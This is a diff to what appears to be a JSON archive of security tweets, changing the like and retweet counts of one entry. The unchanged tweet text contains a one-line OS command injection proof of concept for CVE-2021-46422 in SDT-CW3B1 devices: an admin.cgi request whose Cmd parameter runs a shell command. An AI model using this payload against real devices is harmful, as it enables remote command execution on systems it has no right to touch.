@@ -205,10 +205,10 @@
     "username": "momika233"
 }
 {
-    "tweetfavorites": 448,
+    "tweetfavorites": 446,
     "tweetquotes": 4,
     "tweetreplies": 15,
-    "tweetretweets": 142,
+    "tweetretweets": 141,
     "tweettext": "SDT-CW3B1 1.1.0 - OS Command Injection CVE-2021-46422\n\npoc:hxxp://x.x.x.x/cgi-bin/admin.cgi?Command=sysCommand&amp;Cmd=id\n#0day #nday #CVE #bugbountytips #bugbounty https://t.co/PPJZZ1EStb",
     "tweettime": "2022-05-23, 14:18:58",
     "tweeturl": "https://twitter.com/momika233/status/1528742287072980992",
